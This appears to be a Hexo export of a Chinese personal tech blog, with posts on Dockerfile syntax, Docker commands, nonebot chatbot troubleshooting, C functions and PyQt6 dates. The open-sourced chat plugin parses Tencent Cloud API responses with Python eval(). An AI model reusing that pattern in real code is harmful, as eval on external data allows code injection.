<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USER</span> &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h4><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span></span><br></pre></td></tr></table></figure>
<h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为  test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这时执行新镜像的  Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ONBUILD</span> &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>
<h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>LABEL 指令用来给镜像添加一些元数据（metadata），以键值对的形式，语法格式如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="bash"> &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; </span></span><br></pre></td></tr></table></figure>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.runoob.com/docker/docker-compose.html">菜鸟教程Docker Dockerfile </a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(1)</title>
    <url>/2022/06/05/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（1）"><a href="#Docker使用秘籍（1）" class="headerlink" title="Docker使用秘籍（1）"></a>Docker使用秘籍（1）</h1><p>近期再次进一步学习了一下docker，做一些笔记来总结一下使用心得。本篇为一些初阶的入门命令记录。</p>
<span id="more"></span>
<h2 id="Docker基础配置"><a href="#Docker基础配置" class="headerlink" title="Docker基础配置"></a>Docker基础配置</h2><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh</span><br></pre></td></tr></table></figure>
<h3 id="Dokcer镜像加速"><a href="#Dokcer镜像加速" class="headerlink" title="Dokcer镜像加速"></a>Dokcer镜像加速</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="查看Docker配置情况"><a href="#查看Docker配置情况" class="headerlink" title="查看Docker配置情况"></a>查看Docker配置情况</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker info</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure>
<h3 id="Docker开启、后台运行、重启"><a href="#Docker开启、后台运行、重启" class="headerlink" title="Docker开启、后台运行、重启"></a>Docker开启、后台运行、重启</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="Docker基本命令"><a href="#Docker基本命令" class="headerlink" title="Docker基本命令"></a>Docker基本命令</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><h4 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查看本地镜像"><a href="#查看本地镜像" class="headerlink" title="查看本地镜像"></a>查看本地镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<h4 id="更新镜像"><a href="#更新镜像" class="headerlink" title="更新镜像"></a>更新镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;has update&quot; -a&#x3D;&quot;runoob&quot; e218edb10161 runoob&#x2F;ubuntu:v2</span><br></pre></td></tr></table></figure>
<p>各个参数说明：</p>
<ul>
<li><strong>-m:</strong> 提交的描述信息</li>
<li><strong>-a:</strong> 指定镜像作者</li>
<li><strong>e218edb10161：</strong>容器 ID</li>
<li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li>
</ul>
<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t runoob&#x2F;centos:6.7 .</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-t</strong> ：指定要创建的目标镜像名</li>
<li><strong>.</strong> ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径</li>
</ul>
<h4 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag &lt;id&gt; runoob&#x2F;centos:dev</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-i</strong>: 交互式操作。</li>
<li><strong>-t</strong>: 终端。</li>
<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
<li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
</ul>
<p>要退出终端，直接输入 <strong>exit</strong></p>
<h4 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h4 id="查看所有容器"><a href="#查看所有容器" class="headerlink" title="查看所有容器"></a>查看所有容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<h4 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logs &lt;id&gt;</span><br><span class="line">docker logs &lt;name&gt;</span><br><span class="line">docker logs -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<p><strong>-f:</strong> 让 <strong>docker logs</strong> 像使用 <strong>tail -f</strong> 一样来输出容器内部的标准输出。</p>
<h4 id="后台运行容器"><a href="#后台运行容器" class="headerlink" title="后台运行容器"></a>后台运行容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it -d ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="启动、停止、重启容器"><a href="#启动、停止、重启容器" class="headerlink" title="启动、停止、重启容器"></a>启动、停止、重启容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start &lt;id&gt;</span><br><span class="line">docker stop &lt;id&gt;</span><br><span class="line">docker restart &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;id&gt; &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h4><p>导出容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker export &lt;id&gt; &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>导入容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1</span><br><span class="line">docker import http:&#x2F;&#x2F;example.com&#x2F;exampleimage.tgz example&#x2F;imagerepo</span><br></pre></td></tr></table></figure>
<h4 id="设置web应用端口"><a href="#设置web应用端口" class="headerlink" title="设置web应用端口"></a>设置web应用端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:80 &lt;web&gt;</span><br><span class="line">docker run -d -P &lt;web&gt;</span><br><span class="line">docker port &lt;id&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>-p 前一个端口为宿主机目标端口，后一个是容器端口</li>
<li>-P 为随机分配端口</li>
</ul>
<h4 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker top &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="检查Docker的底层信息"><a href="#检查Docker的底层信息" class="headerlink" title="检查Docker的底层信息"></a>检查Docker的底层信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><h4 id="登录、登出仓库"><a href="#登录、登出仓库" class="headerlink" title="登录、登出仓库"></a>登录、登出仓库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">docker logout</span><br></pre></td></tr></table></figure>
<h4 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker push mapleice&#x2F;ubuntu:18.04</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>近期开发时遇到的一些问题</title>
    <url>/2022/01/26/%E8%BF%91%E6%9C%9F%E5%BC%80%E5%8F%91%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="这几周遇到的问题和解决思路整合"><a href="#这几周遇到的问题和解决思路整合" class="headerlink" title="这几周遇到的问题和解决思路整合"></a>这几周遇到的问题和解决思路整合</h1><p>把nonebot2从alpha版本升级到了beta版本，历经了巨大的更新折磨。再次无限感谢nonebot群里群友准备的<a href="https://github.com/nonebot/discussions/discussions/74">升级改动汇总</a>，还有我们的各位大佬群友的帮助。在本次更新正式结束后，将慢慢总结遇到的问题。</p>
<span id="more"></span>
<h2 id="Q1、pypi的源地址"><a href="#Q1、pypi的源地址" class="headerlink" title="Q1、pypi的源地址"></a>Q1、pypi的源地址</h2><p>临时使用（换源都懂，但是有时候国内源更新的太慢，必须用官方源才行）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple/    #清华</span><br><span class="line">pip3 install -i http://mirrors.aliyun.com/pypi/simple/       #阿里源</span><br><span class="line">pip3 install -i https://pypi.mirrors.ustc.edu.cn/simple/     #中科大</span><br><span class="line">pip3 install -i http://pypi.douban.com/simple/               #豆瓣</span><br><span class="line">pip3 install -i https://pypi.python.org/simple/              #pypi</span><br></pre></td></tr></table></figure>
<p>永久换源</p>
<p><img src="https://s2.loli.net/2022/01/26/9wJxmHORE3uhM2r.png" alt=""></p>
<h2 id="Q2、枫酱的聊天黑名单功能"><a href="#Q2、枫酱的聊天黑名单功能" class="headerlink" title="Q2、枫酱的聊天黑名单功能"></a>Q2、枫酱的聊天黑名单功能</h2><p>嗯，因为有人不懂规矩，喜欢和枫酱聊一些不合适的内容，所以加了这个功能，开源一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line">msg = msg[<span class="number">2</span>:] <span class="comment">#beta版本的特性~</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>聊天插件并不复杂，也开源一波</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> nonebot <span class="keyword">import</span> on_command</span><br><span class="line"><span class="keyword">from</span> nonebot.rule <span class="keyword">import</span> to_me</span><br><span class="line"><span class="keyword">from</span> nonebot.typing <span class="keyword">import</span> T_State</span><br><span class="line"><span class="keyword">from</span> nonebot.params <span class="keyword">import</span> State</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters <span class="keyword">import</span> Bot, Event</span><br><span class="line"><span class="keyword">from</span> nonebot.permission <span class="keyword">import</span> SUPERUSER</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tencentcloud.common <span class="keyword">import</span> credential</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.client_profile <span class="keyword">import</span> ClientProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.http_profile <span class="keyword">import</span> HttpProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.exception.tencent_cloud_sdk_exception <span class="keyword">import</span> TencentCloudSDKException</span><br><span class="line"><span class="keyword">from</span> tencentcloud.nlp.v20190408 <span class="keyword">import</span> nlp_client, models</span><br><span class="line"></span><br><span class="line">__plugin_name__ = <span class="string">&#x27;chat&#x27;</span></span><br><span class="line">__plugin_usage__ = <span class="string">&#x27;用法：通过腾讯云的接口与枫酱聊天哦~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># on_command()为针对命令型事件的响应，即以配置的命令前缀为开头的语句，新版本的on_command返回内容会带有指令本身。</span></span><br><span class="line">maplechat = on_command(<span class="string">&quot;枫酱&quot;</span>,priority=<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体响应逻辑部分</span></span><br><span class="line"><span class="meta">@maplechat.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">handle_chat_receive</span>(<span class="params">bot: Bot, event: Event, state: T_State=State(<span class="params"></span>)</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取去除了命令前缀后的信息，并且用strip()去除前后的空格与换行符</span></span><br><span class="line">    msg = <span class="built_in">str</span>(event.get_message()).strip()</span><br><span class="line">    msg = msg[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cred = credential.Credential(SecretId, SecretKey)</span><br><span class="line">        httpProfile = HttpProfile()</span><br><span class="line">        httpProfile.endpoint = <span class="string">&quot;nlp.tencentcloudapi.com&quot;</span></span><br><span class="line">    </span><br><span class="line">        clientProfile = ClientProfile()</span><br><span class="line">        clientProfile.httpProfile = httpProfile</span><br><span class="line">        client = nlp_client.NlpClient(cred, <span class="string">&quot;ap-guangzhou&quot;</span>, clientProfile)</span><br><span class="line">    </span><br><span class="line">        req = models.ChatBotRequest()</span><br><span class="line">        params = &#123;</span><br><span class="line">        <span class="string">&quot;Query&quot;</span> : msg</span><br><span class="line">        &#125;</span><br><span class="line">        req.from_json_string(json.dumps(params))</span><br><span class="line">    </span><br><span class="line">        resp = client.ChatBot(req)</span><br><span class="line">        reply = <span class="built_in">eval</span>(resp.to_json_string())[<span class="string">&quot;Reply&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> TencentCloudSDKException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">    <span class="comment"># finish会向信息来源发回作为参数的字符串，并且在执行后结束响应</span></span><br><span class="line">    <span class="comment"># 如果希望发送后继续执行代码，应该将finish改为send</span></span><br><span class="line">    <span class="keyword">await</span> maplechat.finish(reply)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Q3、Docker-desktop寄了"><a href="#Q3、Docker-desktop寄了" class="headerlink" title="Q3、Docker desktop寄了"></a>Q3、Docker desktop寄了</h2><p>出大问题只能说，折腾了很久，很折磨心态。</p>
<p>报错内容：什么堆栈问题，一个字看不懂。</p>
<p><a href="https://blog.csdn.net/LeungSr/article/details/117900614">解决方案</a></p>
<p>下载了一个<code>wsl.msi</code>，无脑下一步安装就行。</p>
<h2 id="Q4、Docker-desktop又寄了"><a href="#Q4、Docker-desktop又寄了" class="headerlink" title="Q4、Docker desktop又寄了"></a>Q4、Docker desktop又寄了</h2><p>报错内容：</p>
<p>System.InvalidOperationException:<br>Failed to set version to docker-desktop: exit code: -1</p>
<p>临时解决方案：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netsh winsock reset    //以管理员身份进cmd</span><br></pre></td></tr></table></figure>
<p>长期解决方案：</p>
<p><a href="https://blog.csdn.net/guoxingege/article/details/108983329">CSDN1</a></p>
<p><a href="https://blog.csdn.net/MShow006/article/details/103774672">CSDN2</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/151392411">知乎</a></p>
<h2 id="Q5、脚本安装docker"><a href="#Q5、脚本安装docker" class="headerlink" title="Q5、脚本安装docker"></a>Q5、脚本安装docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h2 id="Q6、docker-desktop迁移"><a href="#Q6、docker-desktop迁移" class="headerlink" title="Q6、docker desktop迁移"></a>Q6、docker desktop迁移</h2><p><a href="https://exp-blog.com/container/wsl2-qian-yi-docker-cun-chu-wei-zhi/">WSL2 迁移 Docker 镜像存储位置</a></p>
<h2 id="Q7、CTFd-whale配置"><a href="#Q7、CTFd-whale配置" class="headerlink" title="Q7、CTFd whale配置"></a>Q7、CTFd whale配置</h2><p><img src="https://c.img.dasctf.com/images/2023130/1675054526330-620336a3-a8d7-4f0d-b7fd-30ead09701eb.png" alt="image-20230130125522305"></p>
<p><img src="https://c.img.dasctf.com/images/2023130/1675054546190-f4600f2f-214e-4b60-96a7-71cff139ba74.png" alt="image-20230130125540164"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之函数篇</title>
    <url>/2022/01/13/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%87%BD%E6%95%B0%E7%AF%87/</url>
    <content><![CDATA[<h1 id="函数篇"><a href="#函数篇" class="headerlink" title="函数篇"></a>函数篇</h1><p>本章是函数篇了哦</p>
<span id="more"></span>
<h2 id="初见函数"><a href="#初见函数" class="headerlink" title="初见函数"></a>初见函数</h2><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>求出1-10、20-30、35-45的三个和</p>
<h4 id="非函数代码"><a href="#非函数代码" class="headerlink" title="非函数代码"></a>非函数代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> sum;</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">1</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">1</span>, <span class="number">10</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">20</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">30</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">20</span>, <span class="number">30</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">35</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">45</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">35</span>, <span class="number">45</span>, sum);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：代码复制是程序质量不良的表现。</p>
<h4 id="函数版代码"><a href="#函数版代码" class="headerlink" title="函数版代码"></a>函数版代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum(<span class="number">1</span>,<span class="number">10</span>);</span><br><span class="line">    sum(<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line">    sum(<span class="number">35</span>,<span class="number">45</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="什么是函数"><a href="#什么是函数" class="headerlink" title="什么是函数"></a>什么是函数</h2><p>函数是一块代码，接受零个或多个参数。然后做一件事情，并返回零个或一个值。</p>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void sum(int begin, int end)</code>为函数头</p>
<p>第一个<code>&#123;&#125;</code>中的内容称为函数体</p>
<p><code>sum</code>是函数名，<code>int begin, int end</code>为参数表</p>
<p><code>void</code>是返回类型，在此例子中表明函数不返回函数值</p>
<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><ul>
<li><p>调用语法：函数名(参数值);</p>
</li>
<li><p>()起到了调用函数的功能</p>
</li>
<li>如果有参数，则需要给出正确的数量和顺序</li>
<li>这些值会被按照顺序依次用来初始化函数中的参数</li>
</ul>
<h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h2><p>函数知道每一次是哪里调用它，会返回到正确的地方。</p>
<h2 id="从函数中返回值"><a href="#从函数中返回值" class="headerlink" title="从函数中返回值"></a>从函数中返回值</h2><ul>
<li>return <strong>停止</strong>函数的执行，并送回一个值</li>
<li>return;</li>
<li>return 表达式;</li>
</ul>
<h2 id="没有返回值的函数"><a href="#没有返回值的函数" class="headerlink" title="没有返回值的函数"></a>没有返回值的函数</h2><ul>
<li>void 函数名（参数表）</li>
<li>不能使用带值的return（可以没有return）</li>
<li>调用的时候不能做返回值的赋值</li>
<li>如果函数有返回值，则必须使用带值的return</li>
</ul>
<h2 id="原型声明"><a href="#原型声明" class="headerlink" title="原型声明"></a>原型声明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>; <span class="comment">//声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//以下内容省略</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数头，以“ <strong>;</strong> ”结尾，就构成了函数的原型</li>
<li>函数原型的目的是告诉编译器这个函数长什么样【名称，参数（数量及类型），返回类型】</li>
</ul>
<h2 id="类型不匹配"><a href="#类型不匹配" class="headerlink" title="类型不匹配"></a>类型不匹配</h2><ul>
<li>调用函数时给的值与参数的类型不匹配是C语言传统上最大的漏洞</li>
<li>编译器总是悄悄替你把类型转换好，但是这很可能不是你所期望的。</li>
<li>后续C++、Java会更加严格</li>
</ul>
<h2 id="传值"><a href="#传值" class="headerlink" title="传值"></a>传值</h2><p>每个函数有自己的变量空间，参数也位于这个独立的空间中，和其他函数没有关系。</p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>pyqt6学习</title>
    <url>/2022/01/11/pyqt6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="pyqt6学习笔记"><a href="#pyqt6学习笔记" class="headerlink" title="pyqt6学习笔记"></a>pyqt6学习笔记</h1><p>整点可视化的GUI界面。</p>
<span id="more"></span>
<h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>PyQt6 有 <code>currentDate</code>、<code>currentTime</code> 和 <code>currentDateTime</code> 方法获取当前的日期或时间。</p>
<h3 id="本地时间"><a href="#本地时间" class="headerlink" title="本地时间"></a>本地时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: current_date_time.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDate, QTime, QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDate.currentDate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.ISODate))        <span class="comment">#2022-01-11</span></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.RFC2822Date))    <span class="comment">#11 Jan 2022</span></span><br><span class="line"></span><br><span class="line">datetime = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(datetime.toString())                        <span class="comment">#Tue Jan 11 22:04:52 2022</span></span><br><span class="line"></span><br><span class="line">time = QTime.currentTime()</span><br><span class="line"><span class="built_in">print</span>(time.toString(Qt.DateFormat.ISODate))       <span class="comment">#22:04:52</span></span><br></pre></td></tr></table></figure>
